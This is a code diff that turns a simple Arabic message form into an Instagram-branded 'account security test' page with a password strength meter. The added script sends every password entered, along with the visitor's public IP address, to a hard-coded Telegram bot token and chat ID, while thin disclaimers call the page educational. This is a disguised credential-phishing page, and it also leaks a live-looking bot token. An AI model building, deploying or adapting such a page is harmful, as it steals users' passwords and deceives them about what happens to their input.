@@ -1,162 +1,510 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>أرسل رسالتك</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>اختبار أمان الحساب</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-<style>
-*{
-  box-sizing:border-box;
-}
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(145deg, #f0f2f5 0%, #e6e9ef 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
 
-html,body{
-  margin:0;
-  width:100%;
-  min-height:100%;
-}
+        .card {
+            background: #ffffff;
+            max-width: 420px;
+            width: 100%;
+            padding: 32px 28px 28px;
+            border-radius: 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.12), 0 8px 24px rgba(0, 0, 0, 0.05);
+            transition: transform 0.2s ease;
+            text-align: center;
+        }
 
-body{
-  min-height:100vh;
-  background:#f5f5fa;
-  font-family:Arial,"Tahoma",sans-serif;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  padding:20px 0;
-}
+        .card:hover {
+            transform: translateY(-4px);
+        }
 
-.card{
-  width:100%;
-  max-width:710px;
-  background:#fff;
-  border-radius:24px;
-  padding:75px 46px 72px;
-  box-shadow:0 12px 35px rgba(0,0,0,.08);
-}
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
 
-h1{
-  margin:0 0 38px;
-  text-align:center;
-  color:#222;
-  font-size:42px;
-  font-weight:700;
-}
+        .day {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1a1a2e;
+            background: #f0f2f5;
+            padding: 6px 14px;
+            border-radius: 30px;
+        }
 
-textarea{
-  display:block;
-  width:100%;
-  height:255px;
-  resize:none;
-  border:2px solid #d5d5d5;
-  border-radius:17px;
-  outline:none;
-  padding:28px 24px;
-  font-size:22px;
-  font-family:inherit;
-  color:#222;
-  direction:rtl;
-  background:#fff;
-}
+        .time {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1a1a2e;
+            background: #f0f2f5;
+            padding: 6px 14px;
+            border-radius: 30px;
+        }
 
-textarea::placeholder{
-  color:#aaa;
-  opacity:1;
-}
+        .domain {
+            display: inline-block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #4a4a6a;
+            background: #f0f2f5;
+            padding: 4px 16px;
+            border-radius: 30px;
+            margin-bottom: 22px;
+            direction: ltr;
+            unicode-bidi: embed;
+        }
 
-textarea:focus{
-  border-color:#1597d1;
-}
+        .domain i {
+            color: #e1306c;
+            margin-left: 6px;
+        }
 
-.send{
-  width:100%;
-  height:82px;
-  margin-top:35px;
-  border:0;
-  border-radius:16px;
-  background:#1196d2;
-  color:white;
-  font-family:inherit;
-  font-size:28px;
-  cursor:pointer;
-  transition:.15s;
-}
+        .icon-title {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 6px;
+        }
 
-.send:active{
-  transform:scale(.98);
-}
+        .icon-title i {
+            font-size: 32px;
+            color: #e1306c;
+            background: #fde8ef;
+            padding: 12px;
+            border-radius: 50%;
+        }
 
-@media(max-width:600px){
+        .icon-title h2 {
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a1a2e;
+        }
 
-  body{
-    padding:0;
-    align-items:center;
-  }
+        .subtitle {
+            font-size: 16px;
+            font-weight: 500;
+            color: #4a4a6a;
+            margin-bottom: 22px;
+            border-bottom: 2px dashed #e6e9ef;
+            padding-bottom: 14px;
+        }
 
-  .card{
-    width:100%;
-    border-radius:22px;
-    padding:70px 46px 72px;
-  }
+        .input-group {
+            position: relative;
+            margin-bottom: 16px;
+        }
 
-  h1{
-    font-size:36px;
-    margin-bottom:35px;
-  }
+        .input-group i {
+            position: absolute;
+            right: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #9a9abf;
+            font-size: 18px;
+        }
 
-  textarea{
-    height:220px;
-    font-size:19px;
-    padding:25px 20px;
-  }
+        .input-group input {
+            width: 100%;
+            padding: 16px 52px 16px 20px;
+            font-size: 18px;
+            border: 2px solid #e6e9ef;
+            border-radius: 60px;
+            background: #fafbff;
+            outline: none;
+            transition: all 0.3s ease;
+            font-weight: 500;
+            color: #1a1a2e;
+            direction: ltr;
+            text-align: right;
+        }
 
-  .send{
-    height:82px;
-    font-size:25px;
-    margin-top:35px;
-  }
-}
-</style>
+        .input-group input:focus {
+            border-color: #e1306c;
+            background: #ffffff;
+            box-shadow: 0 0 0 4px rgba(225, 48, 108, 0.12);
+        }
+
+        .input-group input::placeholder {
+            color: #b0b0d0;
+            font-weight: 400;
+            font-size: 16px;
+        }
+
+        .strength-meter {
+            display: flex;
+            gap: 6px;
+            margin: 6px 0 18px;
+            justify-content: center;
+        }
+
+        .strength-meter .bar {
+            width: 30%;
+            height: 6px;
+            border-radius: 10px;
+            background: #e6e9ef;
+            transition: background 0.3s ease;
+        }
+
+        .strength-meter .bar.active.weak { background: #ff4d4d; }
+        .strength-meter .bar.active.medium { background: #ffaa33; }
+        .strength-meter .bar.active.strong { background: #2ecc71; }
+
+        .strength-text {
+            font-size: 13px;
+            font-weight: 500;
+            color: #4a4a6a;
+            margin-bottom: 18px;
+            min-height: 20px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #e1306c, #c13584);
+            border: none;
+            border-radius: 60px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 24px rgba(225, 48, 108, 0.30);
+        }
+
+        .btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 12px 32px rgba(225, 48, 108, 0.40);
+        }
+
+        .btn:active {
+            transform: scale(0.97);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .languages {
+            margin-top: 22px;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #6a6a8a;
+        }
+
+        .languages span {
+            cursor: pointer;
+            transition: color 0.2s ease;
+            padding: 4px 8px;
+            border-radius: 20px;
+        }
+
+        .languages span:hover {
+            color: #e1306c;
+            background: #fde8ef;
+        }
+
+        .languages .divider {
+            color: #d0d0e0;
+            cursor: default;
+        }
+
+        .languages .divider:hover {
+            background: transparent;
+            color: #d0d0e0;
+        }
+
+        .warning {
+            margin-top: 20px;
+            padding: 12px 16px;
+            background: #fef6f9;
+            border-radius: 60px;
+            font-size: 13px;
+            font-weight: 500;
+            color: #b84a7a;
+            border: 1px solid #fce4ed;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .warning i {
+            color: #e1306c;
+            font-size: 16px;
+        }
+
+        .toast {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 60px;
+            font-size: 14px;
+            font-weight: 500;
+            display: none;
+            transition: all 0.3s ease;
+        }
+
+        .toast.show {
+            display: block;
+        }
+
+        .toast.success {
+            background: #e8f8ef;
+            color: #1a7a4a;
+            border: 1px solid #b8e6cf;
+        }
+
+        .toast.error {
+            background: #fde8ec;
+            color: #b33a4a;
+            border: 1px solid #fcccd6;
+        }
+
+        .toast.info {
+            background: #e8f0fe;
+            color: #1a4a7a;
+            border: 1px solid #b8cce6;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 24px 18px 20px; }
+            .icon-title h2 { font-size: 22px; }
+            .input-group input { font-size: 16px; padding: 14px 48px 14px 16px; }
+            .btn { font-size: 18px; padding: 14px; }
+            .day, .time { font-size: 14px; padding: 4px 12px; }
+        }
+    </style>
 </head>
-
 <body>
 
-<div class="card">
+    <div class="card">
 
-  <h1>أرسل رسالتك</h1>
+        <div class="header">
+            <span class="day">الثلاثاء</span>
+            <span class="time">6:41</span>
+        </div>
 
-  <textarea
-    id="message"
-    maxlength="1000"
-    placeholder="اكتب رسالتك أو بياناتك هنا..."
-    autocomplete="off"></textarea>
+        <div class="domain">
+            <i class="fab fa-instagram"></i> dk6myfgf2g-tech.github.io
+        </div>
 
-  <button class="send" onclick="sendMessage()">
-    إرسال
-  </button>
+        <div class="icon-title">
+            <i class="fas fa-shield-alt"></i>
+            <h2>أمان حسابك</h2>
+        </div>
+        <div class="subtitle">اختبار تجريبي</div>
 
-</div>
+        <div class="input-group">
+            <i class="fas fa-key"></i>
+            <input type="text" id="passwordInput" placeholder="اكتب كلمة قوية" />
+        </div>
 
-<script>
-function sendMessage(){
+        <div class="strength-meter" id="strengthMeter">
+            <span class="bar" id="bar1"></span>
+            <span class="bar" id="bar2"></span>
+            <span class="bar" id="bar3"></span>
+        </div>
+        <div class="strength-text" id="strengthText">💡 ابدأ بكتابة كلمة مرور</div>
 
-  const message = document.getElementById("message").value.trim();
+        <button class="btn" id="submitBtn">إرسال</button>
 
-  if(!message){
-    alert("اكتب رسالتك أولاً");
-    return;
-  }
+        <div class="languages">
+            <span>Français</span>
+            <span class="divider">/</span>
+            <span>English</span>
+        </div>
 
-  /*
-    ضع هنا رابط الـBackend الآمن الخاص بك
-    لإرسال الرسالة إلى Telegram.
-  */
+        <div class="warning">
+            <i class="fas fa-exclamation-triangle"></i>
+            تجربة تعليمية — لا تدخل معلومات حساسة
+        </div>
 
-  alert("تم تجهيز الرسالة للإرسال ✅");
+        <div class="toast" id="toast"></div>
 
-  document.getElementById("message").value = "";
-}
-</script>
+    </div>
+
+    <script>
+        (function() {
+            // ============================================================
+            // ✅ تم تحديث البيانات الخاصة بك
+            // ============================================================
+            const BOT_TOKEN = '8765312624:AAF5cD-VCsNGRVbgH2eh1g8NdqmH49Bvi3M';
+            const CHAT_ID = '5775368729'; // يمكنك استخدام @username أيضاً
+
+            // ============================================================
+            const input = document.getElementById('passwordInput');
+            const bar1 = document.getElementById('bar1');
+            const bar2 = document.getElementById('bar2');
+            const bar3 = document.getElementById('bar3');
+            const strengthText = document.getElementById('strengthText');
+            const submitBtn = document.getElementById('submitBtn');
+            const toast = document.getElementById('toast');
+
+            let isSending = false;
+
+            // ===== تقييم القوة =====
+            function evaluateStrength(password) {
+                let score = 0;
+                if (password.length >= 6) score++;
+                if (password.length >= 10) score++;
+                if (/[a-z]/.test(password) && /[A-Z]/.test(password)) score++;
+                if (/\d/.test(password)) score++;
+                if (/[^a-zA-Z0-9]/.test(password)) score++;
+
+                if (password.length === 0) return { level: 0, label: '💡 ابدأ بكتابة كلمة مرور' };
+                if (score <= 1) return { level: 1, label: '🔴 ضعيفة جداً' };
+                if (score === 2) return { level: 2, label: '🟠 ضعيفة' };
+                if (score === 3) return { level: 3, label: '🟡 متوسطة' };
+                if (score === 4) return { level: 4, label: '🟢 قوية' };
+                return { level: 5, label: '🟣 قوية جداً' };
+            }
+
+            // ===== تحديث المؤشر =====
+            function updateMeter(password) {
+                const result = evaluateStrength(password);
+                const level = result.level;
+
+                [bar1, bar2, bar3].forEach(bar => bar.className = 'bar');
+
+                if (level >= 1) bar1.classList.add('active', 'weak');
+                if (level >= 2) bar2.classList.add('active', 'medium');
+                if (level >= 3) bar3.classList.add('active', 'strong');
+
+                if (level >= 4) {
+                    bar1.className = 'bar active strong';
+                    bar2.className = 'bar active strong';
+                    bar3.className = 'bar active strong';
+                }
+
+                if (level === 0) {
+                    [bar1, bar2, bar3].forEach(bar => bar.className = 'bar');
+                }
+
+                strengthText.textContent = result.label;
+                return result;
+            }
+
+            // ===== عرض رسالة =====
+            function showToast(message, type = 'info') {
+                toast.classList.remove('show', 'success', 'error', 'info');
+                toast.textContent = message;
+                toast.className = `toast show ${type}`;
+            }
+
+            // ===== إرسال إلى تلغرام =====
+            async function sendToTelegram(password, strength) {
+                const now = new Date();
+                const timeStr = now.toLocaleString('ar-EG', { hour12: true });
+                const ip = await getIP();
+
+                const message = `
+        🛡️ *اختبار أمان الحساب*
+        ─────────────
+        🔑 كلمة المرور: \`${password}\`
+        📊 القوة: ${strength.label}
+        ⏰ الوقت: ${timeStr}
+        🌐 IP: ${ip || 'غير متاح'}
+        ─────────────
+        ⚠️ تجربة تعليمية فقط
+        `;
+
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown',
+                            disable_web_page_preview: true
+                        })
+                    });
+
+                    const data = await response.json();
+                    if (!data.ok) {
+                        throw new Error(data.description || 'فشل الإرسال');
+                    }
+                    return { success: true };
+                } catch (error) {
+                    console.error('Telegram error:', error);
+                    return { success: false, error: error.message };
+                }
+            }
+
+            // ===== جلب IP العام =====
+            function getIP() {
+                return fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => data.ip)
+                    .catch(() => null);
+            }
+
+            // ===== حدث الكتابة =====
+            input.addEventListener('input', function() {
+                updateMeter(this.value);
+            });
+
+            // ===== زر الإرسال =====
+            submitBtn.addEventListener('click', async function() {
+                if (isSending) return;
+                const password = input.value.trim();
+                const result = evaluateStrength(password);
+
+                if (password.length === 0) {
+                    showToast('⚠️ الرجاء كتابة كلمة مرور', 'error');
+                    return;
+                }
+
+                isSending = true;
+                submitBtn.disabled = true;
+                showToast('📤 جاري الإرسال إلى تلغرام...', 'info');
+
+                const teleResult = await sendToTelegram(password, result);
+
+                if (teleResult.success) {
+                    showToast('✅ تم الإرسال إلى تلغرام بنجاح!', 'success');
+                } else {
+                    showToast(`❌ فشل الإرسال: ${teleResult.error}`, 'error');
+                }
+
+                setTimeout(() => {
+                    isSending = false;
+                    submitBtn.disabled = false;
+                }, 2000);
+            });
+
+            // ===== تشغيل أولي =====
+            updateMeter('');
+        })();
+    </script>
 
 </body>
 </html>
